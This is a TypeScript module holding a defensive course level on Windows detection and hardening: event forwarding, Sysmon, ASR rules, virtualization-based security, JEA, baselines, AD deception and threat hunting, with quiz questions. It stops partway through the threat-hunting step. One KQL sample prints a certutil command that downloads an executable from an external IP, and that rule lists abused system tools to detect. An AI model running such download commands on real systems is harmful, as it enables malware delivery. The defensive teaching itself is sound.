import type { Level } from '../types'

const level: Level = {
  id: 'skilled',
  title: 'Engineering Windows defence at scale',
  summary:
    'Build a real Windows detection-and-response capability: centralized event forwarding into a SIEM, a well-engineered Sysmon config, Attack Surface Reduction and exploit protection, virtualization-based security, host segmentation, constrained PowerShell (CLM/JEA), security baselines at scale, Windows deception, and forensic artefacts.',
  outcomes: [
    'Centralize Windows logs with WEF and feed a SIEM',
    'Engineer a Sysmon config and detections mapped to ATT&CK',
    'Deploy ASR rules, exploit protection and virtualization-based security',
    'Use host firewall/IPsec segmentation and constrained PowerShell',
    'Apply security baselines and Windows deception at scale',
    'Analyse Windows forensic artefacts (MFT, USN, prefetch, amcache)',
  ],
  steps: [
    {
      id: 'bwin-s-01',
      title: 'Windows Event Forwarding',
      read: `Logs stuck on each endpoint are unsearchable at scale and are erasable by an attacker with local admin. **Windows Event Forwarding (WEF)** ships events from every machine to a central **collector**, built into Windows with no third-party agent.

## How it works

- **Source computers** forward selected events over WinRM to a **Windows Event Collector (WEC)** server, using **subscriptions** that define which events to collect.
- **Push** (source-initiated) is the norm at scale: configure sources by GPO to report to the collector, and they enrol automatically — no per-machine agent to deploy.
- The collector aggregates into the **Forwarded Events** log (or forwards onward to a SIEM).

## Why it matters for defence

- **Tamper resistance** — events leave the endpoint in near-real-time, so an attacker who later clears the local log cannot recall what already reached the collector (the centralized-logging lesson, in Windows form).
- **Scale** — one place to hunt across thousands of hosts; correlation of an attack sweeping the fleet.
- **Survivability** — a wiped or ransomwared host still has its history on the collector.

## What to forward

You do not forward everything — that is expensive and noisy. You curate high-value events: authentication (4624/4625/4672), account and group changes (4720/4728/4732/4756), process creation with command line (4688), PowerShell (4104), service and task creation (7045/4698), Defender detections, WMI activity, and Sysmon. Microsoft and the community publish curated WEF subscription sets (e.g. the "Palantir WEF" configuration) as a strong starting point.

WEF is the free, native foundation of centralized Windows logging: enable it, curate the subscriptions to the events your detections need, and you have turned a fleet of isolated endpoints into a searchable, tamper-resistant sensor network — the prerequisite for everything else in this level.`,
      sample: {
        lang: 'text',
        caption: 'Source-initiated WEF: endpoints push curated events to a collector',
        code: `[ WKSTN-01 ]  [ WKSTN-02 ]  ...  [ SRV-14 ]
     |             |                   |
     |  WinRM (curated subscription: 4624/4688/4104/7045/Sysmon...)
     +-------------+---------+---------+
                             v
                   [ WEC collector ]  Forwarded Events log
                             v
                   [ SIEM: search + detect + alert across the fleet ]

Configured by GPO -> new machines enrol automatically, no agent.`,
        output: `Events leave each host in near-real-time. An attacker who
clears a local log afterward cannot erase what already
reached the collector. One place to hunt the whole fleet.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Beyond convenience, what is the key security advantage of forwarding Windows events to a central collector (WEF) in near-real-time?',
        options: [
          'It compresses the logs',
          'The evidence leaves the endpoint immediately, so an attacker with local admin who later clears the machine’s event log cannot remove what has already been collected — plus it enables fleet-wide correlation and survives a wiped host',
          'It prevents attackers from getting local admin',
          'It disables the local Event Log',
        ],
        answer: 1,
        explain:
          'A local log is only as trustworthy as the host. WEF gets events off the machine as they happen, so clearing `/`tampering with the local Security log afterward does not recall the copy on the collector. Add fleet-wide search/correlation and survivability of wiped hosts, and WEF becomes the native, agentless foundation of tamper-resistant Windows logging — the same principle as centralized syslog on Linux.',
        hint: 'What can an attacker with local admin do to the local log, and does that reach the collector’s copy?',
      },
    },

    {
      id: 'bwin-s-02',
      title: 'A Windows detection pipeline',
      read: `WEF/Sysmon produce telemetry; a **SIEM** turns it into detection at scale. The skilled defender engineers the pipeline: collect → normalise → detect → alert → hunt.

## The pipeline

1. **Collect** — WEF collector and/or agents (Winlogbeat, the Elastic agent, Splunk UF, Azure Monitor Agent) ship events to the SIEM (Elastic, Splunk, Microsoft Sentinel, etc.).
2. **Normalise** — map disparate fields into a common schema (e.g. **ECS** in Elastic, **ASIM** in Sentinel) so a rule for "process creation" works regardless of source. Consistent field names are what make portable detections possible.
3. **Detect** — rules (often **Sigma**, compiled to the backend query language: KQL for Sentinel, SPL for Splunk, EQL/Lucene for Elastic) fire on suspicious patterns, tagged with ATT&CK technique and severity.
4. **Alert & triage** — enrich (asset criticality, threat intel), deduplicate, and route to analysts with enough context to decide fast.
5. **Hunt** — analysts run ad-hoc queries against the same data for what rules missed.

## Detections as code

Treat rules like software: in version control, peer-reviewed, tested against known-good and known-bad data, and **tuned**. A rule firing 500 times a day trains analysts to ignore it — noise is worse than silence because it buries the real alert. Track each rule's true/false-positive rate; prune or fix the noisy ones.

## KQL, the modern lingua franca

Microsoft's **Kusto Query Language (KQL)** powers Sentinel and Defender advanced hunting, and is worth knowing: it reads left-to-right as a pipeline (\`Table | where ... | summarize ... | order by ...\`) — the same shape as the PowerShell and awk idioms you already use. The concepts transfer across SIEMs even when the syntax differs.

The pipeline is the machine that converts raw Windows telemetry into timely, high-signal detections and gives hunters a searchable history. Engineering it — good normalisation, version-controlled tuned rules mapped to ATT&CK, and enrichment — is what separates "we have logs" from "we detect attacks."`,
      sample: {
        lang: 'text',
        caption: 'A KQL detection: Office spawning a scripting/download tool',
        code: `DeviceProcessEvents
| where InitiatingProcessFileName in~ ("winword.exe","excel.exe","outlook.exe")
| where FileName in~ ("powershell.exe","cmd.exe","mshta.exe","certutil.exe","wscript.exe")
| project Timestamp, DeviceName, AccountName,
          InitiatingProcessFileName, FileName, ProcessCommandLine
| order by Timestamp desc`,
        output: `Timestamp  Device   Account InitiatingProcess  FileName      CommandLine
--------- -------- ------- -----------------  ------------  -----------
09:14:02  WKSTN-07 jdoe    winword.exe        certutil.exe  certutil -urlcache -f http://203.0.113.9/p.exe ...
# One tuned, ATT&CK-tagged rule (T1059/T1105), running across
# every endpoint in the SIEM. The KQL pipeline reads like awk.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is normalising events into a common schema (like ECS or ASIM) a critical step in a detection pipeline?',
        options: [
          'It reduces storage costs only',
          'It maps different sources’ fields into consistent names, so a single detection rule works across varied log sources and vendors — making detections portable and correlation across event types possible, instead of writing a separate rule per source format',
          'It encrypts the events',
          'It deletes duplicate events',
        ],
        answer: 1,
        explain:
          'Raw events from Windows, Sysmon, firewalls and cloud all name the same concept (a source IP, a process name) differently. Normalising to a common schema lets one rule for "process creation" or "network connection" match every source, and lets you correlate across event types. Without it, detections are brittle and source-specific. Consistent fields are the foundation that makes portable, maintainable detection-as-code possible.',
        hint: 'How many rules do you need for "process creation" if every source names the fields differently — versus if they share a schema?',
      },
    },

    {
      id: 'bwin-s-03',
      title: 'Engineering a Sysmon configuration',
      read: `Sysmon's power is entirely in its **configuration**. Run it with an empty config and it logs almost nothing useful; run it with a well-engineered one and it becomes the richest free Windows sensor there is. Tuning that config is a core skilled skill.

## The config model

A Sysmon config is XML that **includes** (logs) or **excludes** (ignores) events per event type, using field filters. The two philosophies:

- **Exclude-based** (log everything except known-good) — comprehensive but noisy; hard to maintain.
- **Include-based** (log only what matters) — quieter and more precise; the modern preference. Community configs like **SwiftOnSecurity's sysmon-config** and **Olaf Hartong's sysmon-modular** are excellent, well-documented starting points — modular ones even tag rules with ATT&CK techniques.

## The high-value event types

- **Event 1 (Process create)** — with command line, hashes, **and parent** — the backbone of most detections.
- **Event 3 (Network connect)** — per-process outbound connections (C2, exfil).
- **Event 7 (Image load)** — DLLs loaded; catches DLL side-loading/injection.
- **Event 8 (CreateRemoteThread)** and **10 (ProcessAccess)** — injection and **LSASS access** (credential dumping!). ProcessAccess to lsass.exe by an unusual process is a top-tier detection.
- **Event 11 (File create)**, **12–14 (Registry)**, **13 (persistence keys)**, **22 (DNS query)**, **23 (file delete)**.

## Engineering discipline

- **Tune to your environment** — every network is different; a config that is quiet elsewhere may be noisy for you. Baseline, then suppress the benign specifically (by hash/path/signer), never by disabling a whole event type.
- **Version-control the config** and roll it out by GPO/deployment tool; review changes like code.
- **Map coverage to ATT&CK** — know which techniques your config can see, so gaps are visible.

A great Sysmon config, forwarded via WEF into your SIEM, is the single highest-leverage free investment in Windows detection. The art is precision: capture the events attacks cannot avoid (process trees, LSASS access, network, image loads) while keeping the volume low enough that the signal is findable.`,
      sample: {
        lang: 'text',
        caption: 'A Sysmon rule for the highest-value detection: LSASS access',
        code: `<Sysmon schemaversion="4.90">
 <EventFiltering>
  <!-- Event 10: something opened a handle to LSASS memory -->
  <ProcessAccess onmatch="include">
    <TargetImage condition="image">lsass.exe</TargetImage>
  </ProcessAccess>
  <!-- then exclude known-good accessors by signer/path to cut noise -->
  <ProcessAccess onmatch="exclude">
    <SourceImage condition="is">C:\\Windows\\System32\\wininit.exe</SourceImage>
  </ProcessAccess>
 </EventFiltering>
</Sysmon>`,
        output: `Sysmon Event 10:
  SourceImage: C:\\Users\\jdoe\\AppData\\Local\\Temp\\rundll32.exe
  TargetImage: C:\\Windows\\System32\\lsass.exe
  GrantedAccess: 0x1010 (read memory)
# An unusual process reading LSASS = credential dumping.
# High-fidelity: few benign processes open LSASS for read.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is Sysmon Event 10 (ProcessAccess) targeting `lsass.exe` considered one of the highest-fidelity Windows detections?',
        options: [
          'LSASS should never be running',
          'Very few legitimate processes open LSASS memory, so an unusual process obtaining read access to it is a strong indicator of credential dumping (e.g. Mimikatz) — a high-value attacker action with little benign traffic to cause false positives',
          'It detects all network attacks',
          'Event 10 blocks the access',
        ],
        answer: 1,
        explain:
          'Credential theft from LSASS is a hinge of most enterprise breaches, and legitimately almost nothing reads LSASS memory. So Sysmon Event 10 with TargetImage lsass.exe from an unexpected SourceImage is a rare, high-signal event — exactly the kind of behaviour-based detection you want, tuned by excluding the handful of known-good accessors. It complements Credential Guard/PPL (which try to *prevent* the read) with detection of attempts.',
        hint: 'How many normal programs read the memory of the credentials process — and what does it mean when one does?',
      },
    },

    {
      id: 'bwin-s-04',
      title: 'Attack Surface Reduction and exploit protection',
      read: `Modern Windows Defender includes **Attack Surface Reduction (ASR)** rules and **exploit protection** — preventive controls that block whole classes of attack technique, not specific malware. Deploying them well is high-value hardening.

## ASR rules

ASR rules are behaviour blocks that stop common attack techniques regardless of the file involved. Examples:

- **Block Office applications from creating child processes** — kills the "Word spawns PowerShell" macro-attack chain outright.
- **Block Office from creating executable content**, and **block Win32 API calls from Office macros**.
- **Block execution of potentially obfuscated scripts.**
- **Block credential stealing from LSASS** (an ASR rule that hardens against dumping).
- **Block process creations from PSExec and WMI commands** (lateral movement).
- **Block untrusted/unsigned processes from USB.**

Each rule targets a technique attackers rely on. Deploy in **audit mode** first (log what *would* be blocked), confirm no legitimate business process breaks, then switch to **block**. This is the same audit-then-enforce discipline as AppLocker and MAC — measure impact before enforcing.

## Exploit protection

The successor to EMET: system- and per-app **memory-corruption mitigations** — DEP, ASLR (mandatory/bottom-up), CFG (Control Flow Guard), SEHOP, and more. These make exploiting a vulnerable application far harder, buying protection even before a patch exists. Configurable per-application for legacy software that needs specific mitigations.

## Why these matter

They are **preventive and technique-focused**: rather than detecting the malware after it runs, they stop the *action* (Office spawning a child, an exploit's memory trick, LSASS being read). Combined with the detection you have built, they shift the balance toward "the technique is blocked" — and every ASR rule you can move from audit to block deletes a category of attack. The one discipline: always audit first, because a block rule that breaks a business-critical app will be turned off entirely, losing all its value.`,
      sample: {
        lang: 'powershell',
        caption: 'Deploying an ASR rule in audit mode, then reviewing impact',
        code: `# "Block Office apps from creating child processes" -> AuditMode (2) first
$rule = "D4F940AB-401B-4EFC-AADC-AD5F3C50688A"
Set-MpPreference -AttackSurfaceReductionRules_Ids $rule -AttackSurfaceReductionRules_Actions 2

# review what WOULD have been blocked (ASR audit event 1122):
$log = "Microsoft-Windows-Windows Defender/Operational"
Get-WinEvent -LogName $log | Where-Object Id -eq 1122`,
        output: `winword.exe would block child powershell.exe  (jdoe, WKSTN-07)
excel.exe   would block child cmd.exe          (finance macro - LEGIT!)
# The finance macro is why you audit first: allow-list it,
# THEN switch the rule to Block (action 1). Enforcing blind
# breaks the business, and a broken rule gets turned off entirely.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why should Attack Surface Reduction (ASR) rules be deployed in audit mode before switching them to block?',
        options: [
          'Audit mode is more secure than block mode',
          'Audit mode logs what each rule would block without actually blocking, so you can find and allow-list legitimate business processes that would otherwise break — preventing the rule from being disabled entirely once enforced (and losing all its protection)',
          'Block mode does not work on modern Windows',
          'Audit mode blocks more attacks',
        ],
        answer: 1,
        explain:
          'A technique-blocking rule can catch a legitimate but unusual business process (e.g. a finance macro spawning a child). If you enforce blind and break something important, the rule gets turned off and you lose all its value. Audit mode reveals the impact first, so you allow-list the genuine exceptions and then enforce with confidence — the same measure-then-enforce discipline as AppLocker and MAC.',
        hint: 'What happens to a block rule that breaks a critical business app — and how do you avoid that?',
      },
    },

    {
      id: 'bwin-s-05',
      title: 'Virtualization-based security',
      read: `Modern Windows can use the CPU's virtualization to create a **protected world** the normal OS — and therefore malware, even with kernel privileges — cannot tamper with. This **Virtualization-Based Security (VBS)** underpins several of the strongest Windows defences.

## What VBS provides

- **Credential Guard** (met earlier) — isolates LSASS secrets in the VBS-protected environment, so credential dumpers cannot read domain hashes/tickets from LSASS memory. VBS is what makes it robust.
- **HVCI / Memory Integrity** (Hypervisor-protected Code Integrity) — enforces that only signed, validated code runs in the kernel, from within the protected world. This blocks a huge class of kernel attacks: an attacker cannot load an unsigned malicious driver (a kernel rootkit) because the integrity check lives somewhere the kernel itself cannot subvert. It is the strong answer to the "kernel rootkit can lie to everything" problem from the Linux pro level.
- **WDAC** (application control) enforced with hypervisor protection.

## Requirements and trade-offs

VBS needs modern hardware (virtualization extensions, TPM, Secure Boot, and for HVCI, signed drivers). HVCI in particular can conflict with old, unsigned, or poorly written drivers — so, as ever, you **test** (Microsoft's readiness tools flag incompatible drivers) before broad deployment. The payoff is worth it: HVCI and Credential Guard together neutralise kernel rootkits and LSASS credential theft, two of the most damaging techniques.

## Secure Boot and the boot chain

VBS builds on a trusted boot: **Secure Boot** ensures only signed bootloaders/firmware run, so an attacker cannot subvert the machine *before* Windows (and VBS) start. The chain of trust — Secure Boot → trusted kernel → VBS-protected world → Credential Guard/HVCI — is what lets you trust integrity checks even against an adversary with kernel access.

The skilled takeaway: VBS moves the crown-jewel protections (credentials, code integrity) into a boundary the OS kernel cannot cross, so even a kernel-level compromise cannot steal domain credentials or load a rootkit. Enabling Credential Guard and HVCI (after driver testing), on Secure-Boot hardware, is among the strongest hardening steps available on Windows.`,
      sample: {
        lang: 'powershell',
        caption: 'Confirming VBS, HVCI and Credential Guard are running',
        code: `$ns = "root\\Microsoft\\Windows\\DeviceGuard"
Get-CimInstance Win32_DeviceGuard -Namespace $ns |
  Select VirtualizationBasedSecurityStatus,
         SecurityServicesConfigured, SecurityServicesRunning`,
        output: `VirtualizationBasedSecurityStatus : 2   (2 = running)
SecurityServicesConfigured        : {1, 2}   1=CredGuard 2=HVCI
SecurityServicesRunning           : {1, 2}   both ACTIVE
# HVCI: unsigned kernel drivers (rootkits) cannot load.
# Credential Guard: LSASS domain secrets isolated from dumpers.
# Both enforced from a world the kernel itself cannot tamper with.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'How does HVCI (Memory Integrity), built on virtualization-based security, defend against kernel rootkits — even an attacker who has kernel-level access?',
        options: [
          'It scans the kernel for known rootkit signatures',
          'It enforces that only signed, validated code can run in the kernel, and it does so from a hypervisor-protected environment the kernel itself cannot modify — so an attacker cannot load an unsigned malicious driver, and cannot disable the check by subverting the kernel',
          'It encrypts the kernel',
          'It moves the kernel into a container',
        ],
        answer: 1,
        explain:
          'The Linux pro level noted that a kernel rootkit can lie to everything because it runs at the layer all tools trust. HVCI answers this by placing code-integrity enforcement in a VBS-protected world separate from and inaccessible to the kernel: unsigned drivers are refused, and an attacker with kernel access still cannot turn the enforcement off. Combined with Secure Boot and Credential Guard, it moves the trust boundary below the kernel.',
        hint: 'Where does the code-integrity check live relative to the kernel, and can a kernel-level attacker reach it?',
      },
    },

    {
      id: 'bwin-s-06',
      title: 'Host firewall segmentation and IPsec',
      read: `Network segmentation is usually thought of as a job for network switches and VLANs. On Windows, the **host firewall** — deployed by GPO — can enforce **micro-segmentation** at every endpoint, which is often faster and finer-grained than re-architecting the physical network. This is a core zero-trust building block.

## Host-based segmentation

Configure Windows Firewall (via GPO) to control not just *inbound* but *lateral* traffic between endpoints:

- **Block workstation-to-workstation traffic** — ordinary user PCs almost never need to talk to each other on SMB/RPC/WinRM. Blocking peer-to-peer lateral protocols on workstations stops a huge fraction of lateral movement with essentially no user impact.
- **Restrict management protocols** — only allow SMB/RDP/WinRM to a host *from* designated admin/jump hosts, not from anywhere.
- **Default-deny inbound, allow by exception** on each host — so even inside the LAN, a service is reachable only by who needs it.

This contains a compromised host: an attacker on one workstation cannot pivot to peers because the peers' firewalls refuse the connection — segmentation enforced at the endpoint, exactly the zero-trust "remove implicit interior trust" idea.

## IPsec and authenticated connections

Windows Firewall with Advanced Security can require **IPsec** — so a connection is allowed only if the peer **authenticates** (and optionally encrypts). This enables **Domain Isolation**: domain members only accept connections from other authenticated domain members, and you can build fine-grained rules ("only these authenticated hosts may reach the database"). It is identity-based network policy without new hardware — a practical step toward zero trust on an existing AD network.

## Why the skilled defender uses it

Physical re-segmentation is slow and expensive; host-firewall segmentation via GPO can be rolled out to thousands of machines quickly and adjusted centrally. Blocking lateral protocols between workstations alone dramatically shrinks the "one foothold, free lateral movement" problem — and it directly complements tiering (limiting where credentials go) with limiting where *connections* can go.`,
      sample: {
        lang: 'powershell',
        caption: 'Blocking workstation-to-workstation lateral protocols (via GPO)',
        code: `# deny inbound SMB on workstations EXCEPT from admin/jump hosts
$smb = @{ Direction='Inbound'; Protocol='TCP'; LocalPort=445 }
New-NetFirewallRule -DisplayName "Block peer SMB (lateral)" @smb -RemoteAddress 10.20.0.0/16 -Action Block
New-NetFirewallRule -DisplayName "Allow SMB from jump hosts" @smb -RemoteAddress 10.99.0.10,10.99.0.11 -Action Allow`,
        output: `Result on the fleet:
  attacker on WKSTN-A tries SMB/PsExec to WKSTN-B  -> BLOCKED
  admin from jump host 10.99.0.10 to WKSTN-B       -> ALLOWED
# Lateral movement between peers dies; legitimate admin still works.
# Rolled out to every workstation by one GPO.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is blocking workstation-to-workstation lateral protocols (SMB/RPC/WinRM) via the host firewall such a high-value, low-impact control?',
        options: [
          'Workstations run faster without SMB',
          'Ordinary workstations rarely need to connect to each other over those protocols, so blocking peer-to-peer lateral traffic stops a large fraction of lateral movement between endpoints while barely affecting users — enforcing segmentation at every host without re-architecting the network',
          'It prevents all malware from running',
          'It replaces the need for a network firewall',
        ],
        answer: 1,
        explain:
          'Lateral movement usually hops workstation-to-workstation or workstation-to-server over SMB/RPC/WinRM. Users almost never need peer-to-peer connections on those ports, so blocking them (allowing only from admin/jump hosts) contains a compromised endpoint with minimal disruption — and it deploys fleet-wide via one GPO, far faster than physical re-segmentation. It complements tiering (where credentials go) by constraining where connections go, a zero-trust cornerstone.',
        hint: 'Do normal user PCs need to talk to each other over SMB/WinRM, and what does blocking that deny an attacker?',
      },
    },

    {
      id: 'bwin-s-07',
      title: 'Constraining PowerShell: CLM and JEA',
      read: `PowerShell is both an admin necessity and an attacker favourite. Rather than trying (and failing) to block it, skilled defenders **constrain** it — limiting what it can do while preserving legitimate administration.

## Constrained Language Mode (CLM)

PowerShell's **Constrained Language Mode** restricts the language to a safe subset: it blocks the .NET/API calls, type creation, and COM access that attack tooling relies on, while still allowing normal cmdlets and scripts. Crucially, CLM is **enforced automatically when application control (WDAC/AppLocker) is in enforcement** — so a properly locked-down machine puts PowerShell into CLM for you, neutering most weaponised PowerShell (which needs full-language features like reflective loading) without breaking ordinary admin scripts. CLM is one of the strongest reasons to deploy application control.

## Just Enough Administration (JEA)

**JEA** lets you grant administration through PowerShell **without granting full admin rights**. You define a **role capability** (exactly which cmdlets/parameters a role may run) and a **session configuration** (who can connect, and that sessions run as a **virtual privileged account**, not the user). Then a helpdesk user can, say, restart a specific service on a server — and *only* that — over PowerShell remoting, while never actually holding admin credentials on the box.

Benefits:

- **Least privilege for administration** — delegate narrow tasks without handing out membership of Administrators.
- **No standing credentials to steal** — the user connects with their normal account; the elevated action runs as a temporary virtual account, so there is no admin credential cached on the endpoint for an attacker to harvest.
- **Full transcription** — every JEA session is logged, giving a precise audit trail of privileged actions.

## The combination

CLM (via application control) declaws attacker PowerShell; JEA replaces broad admin rights with narrowly scoped, audited, credential-safe delegation. Together they let you keep PowerShell — which you need — while removing most of what makes it dangerous in an attacker's hands. It is least privilege applied to the most powerful and most abused tool on the platform.`,
      sample: {
        lang: 'powershell',
        caption: 'JEA: let helpdesk restart one service, with no admin rights',
        code: `# role capability (.psrc): the ONLY thing this role may do
@{
  VisibleCmdlets = @{ Name = 'Restart-Service';
                      Parameters = @{ Name='Name';
                        ValidateSet='Spooler','W3SVC' } }
}
# session config (.pssc): runs as a virtual admin, transcribed
@{ SessionType='RestrictedRemoteServer'; RunAsVirtualAccount=$true;
   TranscriptDirectory='C:\\JEA-Logs' }`,
        output: `Helpdesk user connects via PS remoting and can run ONLY:
  Restart-Service -Name Spooler   (or W3SVC)   -> allowed
  Get-Content C:\\Windows\\...                    -> BLOCKED (not in role)
# The user never holds admin creds; the action runs as a temp
# virtual account; every command is transcribed. Least privilege.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'How does Just Enough Administration (JEA) reduce credential-theft risk while still letting a helpdesk user perform a privileged task?',
        options: [
          'It gives the helpdesk user full admin rights temporarily',
          'The user connects with their normal (non-admin) account, and the delegated task runs under a temporary virtual privileged account limited to specific cmdlets — so no standing admin credential is ever cached on the endpoint for an attacker to steal, and every action is logged',
          'It stores the admin password in the script',
          'It disables PowerShell remoting',
        ],
        answer: 1,
        explain:
          'JEA delegates narrow capabilities (e.g. restart one service) without making the user an administrator. The elevated action runs as a transient virtual account, so there is no admin credential sitting in that machine’s memory to harvest — removing the very thing pass-the-hash and LSASS dumping rely on — while the role capability enforces least privilege and transcription provides an audit trail. It keeps administration possible without leaving reusable privilege behind.',
        hint: 'Whose credentials are actually present on the endpoint during a JEA session, and for how long?',
      },
    },

    {
      id: 'bwin-s-08',
      title: 'Security baselines at scale',
      read: `Hardening one machine by hand does not scale and does not stay done — the same lesson as on Linux. On Windows, you enforce a **security baseline** across the fleet through Group Policy or Intune, and measure compliance.

## Ready-made baselines

You do not invent settings from scratch. Use vetted baselines:

- **Microsoft Security Compliance Toolkit** — Microsoft's recommended GPO baselines for each Windows/Server/Office version, importable directly.
- **CIS Benchmarks** — consensus hardening standards, with matching GPO/Intune content and scoring tools.
- **DISA STIGs** — stringent government baselines.

These encode hundreds of decisions (audit policy, user rights, security options, service configs, the legacy-protocol and credential protections from earlier levels) that would take forever to derive alone.

## Applying and enforcing

- **On-prem AD** — import the baseline GPOs, link them to the right OUs, and every domain-joined machine receives and re-applies the settings automatically. Drift is corrected at each Group Policy refresh — configuration-as-code, Windows-style.
- **Modern/cloud** — **Intune** configuration profiles and security baselines apply the same idea to cloud-managed and remote devices.

## Measuring compliance

"Are we hardened?" needs a number, not an opinion:

- **Microsoft's Policy Analyzer / SCT** compares a machine's effective policy against the baseline and reports every deviation.
- **CIS-CAT** scores against the CIS benchmark.
- **Microsoft Secure Score** gives a tenant-wide posture number for cloud/M365.

Track the score over time; each gap is a work item, and the trend proves the program is improving.

## The discipline

Version-control your baseline (exported GPO backups / Intune profiles as code), review changes, deploy centrally, and re-scan regularly for drift and regressions. This turns "we hardened the machines" (a one-time hope) into "every machine is continuously enforced to a measured standard, and deviations are detected and corrected" — a control you can trust and evidence to an auditor, the direct Windows parallel to Ansible + OpenSCAP on Linux.`,
      sample: {
        lang: 'text',
        caption: 'Scoring machines against a baseline (Policy Analyzer / CIS-CAT)',
        code: `Baseline: Windows 11 Security Baseline (SCT) + CIS L1

Setting                                    Baseline  Machine   Result
------------------------------------------------------------------------
Enable command-line in 4688                Enabled   Enabled   PASS
PowerShell Script Block Logging            Enabled   Enabled   PASS
LAN Manager auth level                     NTLMv2    Send LM   FAIL <-
SMBv1 client/server                        Disabled  Enabled   FAIL <-
Credential Guard                           On        Off       FAIL <-
...
Compliance score: 83%   ->  remediate FAILs, re-scan, target 95%+`,
        output: `Every FAIL is a concrete work item; the score is the metric.
Applied by GPO/Intune to the whole fleet, re-scanned for drift.
"We hardened it" becomes "measured, enforced, trending to 95%+".`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why do skilled Windows defenders apply vetted baselines (Microsoft SCT, CIS) via GPO/Intune and score compliance, rather than hardening each machine manually?',
        options: [
          'Manual hardening is illegal',
          'Ready-made baselines encode hundreds of vetted settings, GPO/Intune applies and re-applies them consistently across the whole fleet (correcting drift), and compliance scoring turns "are we hardened?" into a measurable number with a concrete remediation list — repeatable, enforced, provable security instead of per-machine effort',
          'GPO is the only way to change settings',
          'Baselines make machines run faster',
        ],
        answer: 1,
        explain:
          'Manual hardening produces snowflakes, misses machines, and cannot be proven. Vetted baselines applied through GPO/Intune give one reviewed standard enforced everywhere, with automatic re-application correcting drift, and scoring tools (Policy Analyzer, CIS-CAT, Secure Score) provide a number and a gap list. It is configuration-as-code with measurement — the Windows equivalent of Ansible plus OpenSCAP, and the difference between hoping and knowing.',
        hint: 'What can you prove about fifty hand-hardened machines, versus a baseline applied and scored across the fleet?',
      },
    },

    {
      id: 'bwin-s-09',
      title: 'Deception in Active Directory',
      read: `Deception is as powerful on Windows as on Linux, and AD offers especially rich opportunities: planted accounts, credentials and objects that no legitimate process should ever touch, so any interaction is a near-certain attacker.

## Honey accounts

Create a **decoy privileged-looking account** — a user that appears to be a service account or admin (an enticing name, a fake SPN so it looks Kerberoastable, maybe placed in a group that looks powerful) — but that is **never used** by anything legitimate and has no real access. Then:

- **Any authentication with it** (a 4624/4768/4769 for that account) means an attacker found and tried it — because nothing real ever uses it.
- Give it an SPN and it becomes a **Kerberoast canary**: a 4769 requesting its ticket is a roaster in your domain, with essentially zero false positives.

## Honey credentials and tokens

- **Fake credentials** seeded where attackers look — in memory (via tools that plant them), in a Group Policy Preferences file, in a script, or in a password vault. Any use of them is an alert (the canary-token idea in AD form).
- A **decoy \`cpassword\`** in SYSVOL, or a lure in a scheduled task, that pings when read/used.

## Honey shares and objects

- A **honey file share** named to attract browsing (\`\\\\srv\\HR-Payroll\\\`) with canary documents — access (5140/5145) with no business reason is a lead.
- **Decoy AD objects** and even a **honeypot DC-looking host** on the internal network: any connection is hostile.

## Why deception excels in AD

Detection engineering constantly fights false positives; deception sidesteps them because the bait has **no legitimate use**. In AD specifically, attackers *must* enumerate — they run BloodHound, hunt for Kerberoastable accounts, browse shares, look for cached credentials. Deception litters that enumeration path with tripwires, so the very reconnaissance that precedes an AD attack sets off high-confidence alarms early, before the attacker reaches anything real. Cheap to deploy, loud when it matters, silent otherwise — and it turns the attacker's own methodology against them.`,
      sample: {
        lang: 'text',
        caption: 'A honey account: enticing, never used, alarms on any touch',
        code: `Decoy account "svc_sql_admin":
  - name looks like a privileged service account
  - given a fake SPN  ->  appears Kerberoastable to enumeration
  - placed in a plausible-looking group, but has NO real access
  - used by NOTHING legitimate; documented as a canary

Alert conditions (near-zero false positives):
  4769 requesting svc_sql_admin's ticket   -> a Kerberoaster
  4624/4625 for svc_sql_admin              -> someone tried it
  any LDAP query touching it from a client -> enumeration (BloodHound)`,
        output: `Attackers MUST enumerate AD (Kerberoastable accounts, shares,
cached creds). Deception seeds that path with tripwires, so
their recon triggers high-confidence alerts before they reach
anything real. The bait's lack of legitimate use IS the signal.`,
      },
      question: {
        kind: 'mcq',
        prompt:
          'Why is deception (honey accounts, honey credentials, honey shares) especially effective in Active Directory specifically?',
        options: [
          'It patches AD vulnerabilities',
          'AD attacks require enumeration — attackers hunt for Kerberoastable accounts, browse shares, and look for cached credentials — so seeding that enumeration path with bait that has no legitimate use produces near-zero-false-positive alerts that fire during reconnaissance, before the attacker reaches real targets',
          'It encrypts all AD objects',
          'It only works against external attackers',
        ],
        answer: 1,
        explain:
          'Deception sidesteps the false-positive problem because the bait is never touched in normal operation. AD is a perfect fit: attackers must enumerate (BloodHound, roastable-account hunting, share browsing, credential searching) to progress, so decoy accounts/credentials/shares placed along that path catch them early with high confidence. It turns the attacker’s own required methodology into a set of tripwires — cheap, quiet, and loud exactly when it matters.',
        hint: 'What must an attacker do in AD to find their next step, and what if that path is full of bait nothing legitimate uses?',
      },
    },

    {
      id: 'bwin-s-10',
      title: 'Threat hunting in Windows telemetry',
      read: `With WEF/Sysmon feeding a SIEM, you can **hunt** proactively for the attacker your rules missed — the Windows application of the hypothesis-driven method.

## The hunt loop (Windows edition)

1. **Hypothesis** grounded in TTPs: "if an attacker is here, they likely dumped LSASS" or "used WMI for lateral movement" or "have a scheduled task calling out to the internet."
2. **Query** the telemetry (KQL/SPL/EQL) across the fleet.
3. **Analyse** with stacking/frequency: aggregate an attribute and inspect the rare values.
4. **Conclude** — find evil (→ incident) or gain confidence, *and* learn where visibility has gaps.
5. **Operationalise** — a productive hunt becomes an automated detection.

## High-value Windows hunts

- **Rare parent-child process pairs** — stack \`InitiatingProcess → child\` across the fleet; the one-off pairs (Office → certutil, services.exe → a temp binary) are leads.
- **LSASS access** — every ProcessAccess to lsass.exe by a non-standard SourceImage.
- **Rare binary names/paths** — stack process image paths; the single host running \`svchost.exe\` from AppData stands out (the Linux stacking lesson, Windows data).
- **Beaconing** — regular, periodic outbound connections (Sysmon Event 3 / DNS Event 22) suggest C2. Look at connection timing regularity per process/destination.
- **New services/tasks fleet-wide** — a service name appearing on exactly one host.
- **PowerShell 4104** — stack script-block content; obfuscated or download-cradle blocks surface.

## Stacking is the core technique

